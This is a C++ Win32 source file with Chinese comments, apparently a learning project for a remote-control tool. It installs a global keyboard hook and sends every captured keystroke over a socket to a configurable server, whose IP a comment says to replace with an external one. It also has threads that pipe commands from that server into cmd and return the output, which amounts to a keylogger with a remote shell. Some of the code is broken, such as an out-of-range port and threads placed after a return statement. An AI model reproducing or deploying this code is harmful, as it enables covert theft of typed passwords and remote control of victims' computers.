// keyHook.cpp : 定义应用程序的入口点。
//


#include "stdafx.h"
#include <winsock2.h>
#include <thread>
#include<iostream>
using namespace std;

#include "function.h"
#include "keyHook.h"
#include "common.h"
#pragma  comment(lib,"../../bin/keyboradhook.lib")

#define MAX_LOADSTRING 100
extern SOCKET s;
extern HANDLE hWritePipe; //写端口
extern HANDLE hCmdReadPipe; //cmd读端口

extern HANDLE hReadPipe; //读端口
extern HANDLE hCmdWritePipe; //cmd写端口
BOOL SetKeyHook(HWND hWnd);


// 全局变量: 
HINSTANCE hInst;                                // 当前实例
WCHAR szTitle[MAX_LOADSTRING];                  // 标题栏文本
WCHAR szWindowClass[MAX_LOADSTRING];            // 主窗口类名
HWND g_hWnd;
// 此代码模块中包含的函数的前向声明: 
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
//WinMain 有界面程序的入口
int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // TODO: 在此放置代码。
	InitSocket();
    InitCmd();
	sockaddr_in addr;//用于替换socketaddr结构体 两者大小一致
	addr.sin_family = AF_INET;//写死
	addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");//固定套路 ，填写外网ip 或本地ip 
	addr.sin_port = htons(100861);//坑  h:host to n:network short类型两字节 网络字节序（大尾方式）和本地字节序（小尾方式）
	int nlength = sizeof(sockaddr_in);
	//2.connect 主动连接服务器
	int nRet = connect(s, (sockaddr*)&addr, nlength);
	if (nRet == SOCKET_ERROR) {
		cout << "服务器连接失败！" << endl;
		WSACleanup();
		
	}
	else {
		cout << "服务器连接成功！" << endl;
	}
	





    // 初始化全局字符串
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_KEYHOOK, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);

    // 执行应用程序初始化: 
    if (!InitInstance (hInstance, nCmdShow))
    {
        return FALSE;
    }

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_KEYHOOK));

    MSG msg;

    // 主消息循环: 
    while (GetMessage(&msg, nullptr, 0, 0))
    {
		
		
			
		
		
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
	
    return (int) msg.wParam;
}



//
//  函数: MyRegisterClass()
//
//  目的: 注册窗口类。
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_KEYHOOK));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_KEYHOOK);
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}

//
//   函数: InitInstance(HINSTANCE, int)
//
//   目的: 保存实例句柄并创建主窗口
//
//   注释: 
//
//        在此函数中，我们在全局变量中保存实例句柄并
//        创建和显示主程序窗口。
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hInst = hInstance; // 将实例句柄存储在全局变量中

   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

  if (!hWnd)
   {
      return FALSE;
   }

 
   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   g_hWnd = hWnd;
   BOOL bRet = SetKeyHook(g_hWnd);
   if (!bRet)
   {
	   cout << "下钩子失败" << endl;
	   return 0;
   }
   return TRUE;
   std::thread thd1([&]() {
	   while (true) {
		   char szOutBuf[256] = { 0 };
		   int nRet;
		   nRet = recv(s, szOutBuf, 255, 0);//返回值
		   MyPacket* pPkt = (MyPacket*)szOutBuf;
		   if (nRet == 0) {
			   printf("recv error");
		   }
		   else if (nRet > 0) {
			   if (pPkt->type == PACKET_RLY_CMD)
			   {
				   int nLength = strlen(szOutBuf);
				   unsigned int nWritedLength = 0;
				   if (nLength > 255) {
					   printf("stack overflow");
					   return 0;

				   }


				   BOOL bRet = WriteFile(hWritePipe,
					   szOutBuf,
					   nLength,
					   reinterpret_cast<LPDWORD>(&nWritedLength),
					   NULL //异步有关

				   );
				   if (!bRet) {
					   printf("write file error ");
					   return 0;

				   }



			   }
		   }

	   }
   });
   thd1.detach();
   std::thread thd([&]() {
	   while (true) {
		   CHAR sztBuf[256] = { 0 };
		   DWORD nReadBytes = 0;

		   BOOL bRet = ReadFile(hReadPipe,
			   sztBuf,
			   255,
			   &nReadBytes,
			   NULL);
		   if (!bRet) {
			   printf("read file error ");
			   return 0;

		   }
		   char szBuf[1024];
		   const char* pStr = (const char*)sztBuf;
		   MyPacket* pPkt = (MyPacket*)szBuf;

		   pPkt->type = PACKET_RLY_CMD;
		   pPkt->length = strlen(pStr) + 1;	//仅仅表示数据长度，不包括结构体头部的前面2个4字节。
		   memcpy(pPkt->data, pStr, pPkt->length);	//将数据拷贝给包中
		   send(
			   s,
			   (const char*)pPkt,
			   pPkt->length + sizeof(unsigned int) * 2 + 1,
			   0
		   );


	   }


   });
   thd.detach();
   
}

//
//  函数: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  目的:    处理主窗口的消息。
//
//  WM_COMMAND  - 处理应用程序菜单
//  WM_PAINT    - 绘制主窗口
//  WM_DESTROY  - 发送退出消息并返回
//
//
//响应对应的消息回调函数
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {


	case WM_COPYDATA:
		{
		//表示我们的DLL发送， 我们到这里接受
		PCOPYDATASTRUCT pcds = (PCOPYDATASTRUCT)lParam;
		//OutputDebugStringA((LPCSTR)pcds->lpData);
		const char*pStr = (const char*)pcds->lpData;
		char szBuf[256];
		MyPacket* pPkt = (MyPacket*)szBuf;
		pPkt->type = PACKET_REQ_KEYBOARD;
		pPkt->length = strlen(pStr) + 1; //仅仅表示数据长度，不包括结构体头部的前面2个4字节
		memcpy(pPkt->data, pStr, pPkt->length);

		int nSendBytes = send(s, (const char*)pPkt, sizeof(unsigned int)*2+ pPkt->length, 0);


		}
		break;
    case WM_COMMAND:
        {
            int wmId = LOWORD(wParam);
            // 分析菜单选择: 
            switch (wmId)
            {
            case IDM_ABOUT:
                DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
                break;
            case IDM_EXIT:
                DestroyWindow(hWnd);
                break;
            default:
                return DefWindowProc(hWnd, message, wParam, lParam);
            }
        }
        break;
    case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            // TODO: 在此处添加使用 hdc 的任何绘图代码...
            EndPaint(hWnd, &ps);
        }
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// “关于”框的消息处理程序。
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}
